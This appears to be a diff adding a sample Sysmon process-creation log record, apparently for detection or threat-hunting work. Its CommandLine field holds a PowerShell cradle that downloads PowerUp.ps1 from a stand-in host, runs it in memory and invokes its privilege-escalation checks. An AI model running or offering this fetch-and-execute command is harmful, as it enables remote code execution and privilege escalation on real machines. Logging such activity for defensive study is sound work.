@@ -1,0 +1,25 @@
+Field: 	Value
+CommandLine:	powershell "iex(new-object net.webclient).downloadstring('http://huntmeplz.com/PowerUp.ps1'); Invoke-AllChecks;"
+Company:	Microsoft Corporation
+CurrentDirectory:	C:\Users\victim\Downloads\
+Description:	Windows PowerShell
+EventID:	1
+FileVersion:	10.0.17763.1 (WinBuild.160101.0800)
+Hashes:	MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
+Image:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+IntegrityLevel:	Medium
+LogonGuid:	{4bbef3ae-81e4-630c-b94b-100000000000}
+LogonId	0x104bb9
+OriginalFileName:	PowerShell.EXE
+ParentCommandLine:	cmd.exe
+ParentImage:	C:\Windows\System32\cmd.exe
+ParentProcessGuid:	{4bbef3ae-cbcf-630c-070f-000000000e00}
+ParentProcessId:	1856
+ParentUser:	User\victim
+ProcessGuid:	{4bbef3ae-cbe0-630c-080f-000000000e00}
+ProcessId:	6024
+Product:	Microsoft® Windows® Operating System
+RuleName:	-
+TerminalSessionId:	2
+User:	User\victim
+UtcTime:	2022-08-29 14:23:28.929
